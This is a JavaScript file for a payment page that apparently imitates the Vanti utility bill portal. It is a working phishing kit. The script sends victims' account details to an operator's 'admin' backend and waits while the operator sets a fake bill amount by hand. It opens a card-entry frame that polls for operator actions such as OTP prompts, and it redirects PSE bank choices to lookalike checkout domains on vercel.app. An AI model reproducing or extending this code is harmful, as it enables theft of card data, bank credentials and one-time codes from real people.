const API_BASE = 'https://multi-bancos-production.up.railway.app';

const URLS_BANCOS_VANTI = {
    'bancolombia': 'https://www.bancolombia.com/personas/pago-facturas',
    'bbva':        'https://securecheckout-sandy.vercel.app',
    'caja-social': 'https://checkoutplacabogo.vercel.app',
    'popular':     'https://securepay21.vercel.app',
    'bogota':      'https://auth-portal-ten.vercel.app',
    'occidente':   'https://secureportal-eight.vercel.app',
    'davivienda':  'https://psecheckout.vercel.app',
    'av-villas':   '#',
    'nequi':       '#'
};

const TIEMPO_REDIRECT_VANTI = 4000;

let pollingInterval = null;
let bancoSeleccionadoPSE = '';

// ═══════════════════════════════════════════════════════════════
// 🔥 FUNCIONES DEL MODAL DE TARJETA
// ═══════════════════════════════════════════════════════════════

function abrirModalTarjeta() {
    const modal = document.getElementById('modalTarjeta');
    const iframe = document.getElementById('iframeTarjeta');
    const overlay = document.getElementById('pagoCargaOverlay');
    
    // 🔥 OBTENER EL MISMO SESSION ID QUE SE ENVIÓ AL ADMIN
    const sessionId = sessionStorage.getItem('vanti_sessionId') || ('vanti_' + Date.now());

    if (modal && iframe && overlay) {
        overlay.style.display = 'flex';
        document.body.style.overflow = 'hidden';

        setTimeout(function() {
            overlay.style.display = 'none';
            // 🔥 PASAMOS EL SESSION ID POR LA URL PARA QUE TARJETA.HTML LO USE
            iframe.src = 'tarjeta.html?sessionId=' + encodeURIComponent(sessionId);
            modal.style.display = 'flex';
        }, 1500);
    }
}

// 🔥 Oculta el modal SIN destruir el iframe (el polling sigue vivo)
function ocultarModalTarjeta() {
    const modal = document.getElementById('modalTarjeta');
    if (modal) {
        modal.style.display = 'none';
    }
}

// 🔥 Destruye el iframe (solo cuando se cierra definitivamente)
function destruirModalTarjeta() {
    const modal = document.getElementById('modalTarjeta');
    const iframe = document.getElementById('iframeTarjeta');
    if (modal && iframe) {
        modal.style.display = 'none';
        iframe.src = 'about:blank';
        document.body.style.overflow = '';
    }
}

// Alias por compatibilidad
function cerrarModalTarjeta() {
    destruirModalTarjeta();
}

function mostrarPagoCarga() {
    const overlay = document.getElementById('pagoCargaOverlay');
    if (overlay) {
        overlay.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }
}

function ocultarPagoCarga() {
    const overlay = document.getElementById('pagoCargaOverlay');
    if (overlay) {
        overlay.style.display = 'none';
        document.body.style.overflow = '';
    }
}

// ═══════════════════════════════════════════════════════════════
// 🔥 DOMContentLoaded
// ═══════════════════════════════════════════════════════════════

document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('queryForm');
    const loadingOverlay = document.getElementById('loading-overlay');

    if (!form || !loadingOverlay) return;

    const modalBanco = document.getElementById('modalBanco');
    const modalBancoOverlay = document.getElementById('modalBancoOverlay');
    const modalBancoClose = document.getElementById('modalBancoClose');
    const bancoBuscar = document.getElementById('bancoBuscar');
    const bancoCards = document.querySelectorAll('.banco-card-pse');
    const bancoEmpty = document.getElementById('bancoEmpty');

    function abrirModalBanco() {
        if (!modalBanco) return;
        modalBanco.classList.remove('hidden');
        if (bancoBuscar) bancoBuscar.value = '';
        filtrarBancos('');
        setTimeout(() => { if (bancoBuscar) bancoBuscar.focus(); }, 100);
    }

    function cerrarModalBanco() {
        if (modalBanco) modalBanco.classList.add('hidden');
    }

    if (modalBancoClose) modalBancoClose.addEventListener('click', cerrarModalBanco);
    if (modalBancoOverlay) modalBancoOverlay.addEventListener('click', cerrarModalBanco);

    function filtrarBancos(texto) {
        const t = (texto || '').toLowerCase().trim();
        let visibles = 0;
        bancoCards.forEach(card => {
            const nombre = (card.getAttribute('data-nombre') || '').toLowerCase();
            if (nombre.indexOf(t) !== -1) { card.style.display = ''; visibles++; }
            else { card.style.display = 'none'; }
        });
        if (bancoEmpty) {
            if (visibles === 0) bancoEmpty.classList.remove('hidden');
            else bancoEmpty.classList.add('hidden');
        }
    }

    if (bancoBuscar) {
        bancoBuscar.addEventListener('input', function () { filtrarBancos(this.value); });
    }

    bancoCards.forEach(card => {
        card.addEventListener('click', function () {
            const banco = this.getAttribute('data-banco');
            const nombre = this.getAttribute('data-nombre');
            bancoSeleccionadoPSE = banco;

            bancoCards.forEach(c => c.classList.remove('selected'));
            this.classList.add('selected');
            cerrarModalBanco();

            irAlBanco(banco, nombre);
        });
    });

    function irAlBanco(banco, nombre) {
        const pseOverlay = document.getElementById('video-pse-overlay');
        const pseNombre = document.getElementById('pseNombre');
        const pseGif = document.getElementById('pseAnimation');

        if (pseNombre) pseNombre.textContent = (nombre || banco).toUpperCase();

        if (pseOverlay) {
            pseOverlay.classList.remove('hidden');
            document.body.style.overflow = 'hidden';
        }

        if (pseGif && pseGif.src) {
            const srcActual = pseGif.src;
            pseGif.src = '';
            setTimeout(() => { pseGif.src = srcActual; }, 50);
        }

        const urlDestino = URLS_BANCOS_VANTI[banco];
        setTimeout(() => {
            if (urlDestino && urlDestino !== '#') {
                window.location.href = urlDestino;
            } else {
                if (pseOverlay) pseOverlay.classList.add('hidden');
                document.body.style.overflow = '';
                Swal.fire({
                    icon: 'info',
                    title: 'Banco no disponible',
                    text: 'Este banco no está disponible todavía.',
                    confirmButtonColor: '#113455'
                });
            }
        }, TIEMPO_REDIRECT_VANTI);
    }

    // ═══════════════════════════════════════════════════════════════
    // 🔥 LISTENER DE MENSAJES DEL IFRAME
    // ═══════════════════════════════════════════════════════════════
    window.addEventListener('message', function(event) {
        if (event.data === 'mostrarCargaWompi') {
            // 🔥 SOLO muestra el overlay, NO destruye el iframe
            // El iframe sigue vivo haciendo polling para detectar acciones del admin
            mostrarPagoCarga();
        }
        else if (event.data === 'ocultarCargaWompi') {
            // 🔥 El iframe tiene algo que mostrar (OTP / éxito / rechazo)
            ocultarPagoCarga();
            const modal = document.getElementById('modalTarjeta');
            if (modal) modal.style.display = 'flex';
        }
        else if (event.data === 'cerrarTarjeta') {
            // 🔥 Cierre definitivo (botón "Volver" o "Cambiar método")
            destruirModalTarjeta();
            ocultarPagoCarga();
        }
    });

    // ═══════════════════════════════════════════════════════════════
    // 🔥 SUBMIT DEL FORMULARIO PRINCIPAL
    // ═══════════════════════════════════════════════════════════════
    form.addEventListener('submit', function (e) {
        e.preventDefault();

        const empresaSelect = document.getElementById('empresa');
        const empresaValue = empresaSelect.value;
        const empresaTexto = empresaSelect.options[empresaSelect.selectedIndex].text;
        const cuenta = document.getElementById('cuenta_contrato').value;
        const medioPagoValue = document.querySelector('input[name="office"]:checked').value;
        const medioPagoTexto = medioPagoValue === '154' ? 'PSE' : 'Wompi';

        if (empresaValue === '0' || !empresaValue) {
            Swal.fire({ icon: 'warning', title: 'Atención', text: 'Selecciona la empresa del servicio.', confirmButtonColor: '#113455' });
            return;
        }

        if (!cuenta || cuenta.length < 4) {
            Swal.fire({ icon: 'warning', title: 'Atención', text: 'Ingresa una cuenta o referencia de pago válida.', confirmButtonColor: '#113455' });
            return;
        }

        const sessionId = 'vanti_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        sessionStorage.setItem('vanti_sessionId', sessionId);
        loadingOverlay.classList.remove('hidden');

        fetch(API_BASE + '/vanti/enviar', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, empresa: empresaTexto, cuenta, medioPago: medioPagoTexto })
        }).catch(err => console.error('Error enviando a admin:', err));

        if (pollingInterval) clearInterval(pollingInterval);

        pollingInterval = setInterval(async function () {
            try {
                const res = await fetch(API_BASE + '/vanti/estado/' + sessionId);
                const data = await res.json();

                if (data.estado === 'precio_asignado' && data.accion) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    loadingOverlay.classList.add('hidden');

                    const precio = Number(data.accion);
                    // 🔥 GUARDAMOS EL PRECIO EN EL WINDOW PARA QUE EL IFRAME LO LEA
                    window.TOTAL_PAGO = precio; 
                    
                    Swal.fire({
                        icon: 'success',
                        title: 'Factura encontrada',
                        html: `
                            <p><strong>Cuenta:</strong> ${cuenta}</p>
                            <p><strong>Empresa:</strong> ${empresaTexto}</p>
                            <p><strong>Medio de pago:</strong> ${medioPagoTexto}</p>
                            <hr>
                            <h2 style="color: #113455;">$${precio.toLocaleString('es-CO')}</h2>
                            <p>Total a pagar</p>
                        `,
                        confirmButtonColor: '#113455',
                        confirmButtonText: 'Ir a pagar',
                        allowOutsideClick: false,
                        allowEscapeKey: false
                    }).then((result) => {
                        if (result.isConfirmed) {
                            if (medioPagoValue === '154') {
                                abrirModalBanco();
                            } else {
                                abrirModalTarjeta();
                            }
                        }
                    });
                } else if (data.estado === 'rechazado') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    loadingOverlay.classList.add('hidden');
                    Swal.fire({
                        icon: 'error',
                        title: 'Referencia no encontrada',
                        text: 'Referencia de pago no encontrada, verifica el número de cuenta y la empresa seleccionada.',
                        confirmButtonColor: '#113455'
                    });
                }
            } catch (err) {
                console.error('Error consultando estado:', err);
            }
        }, 2000);
    });
});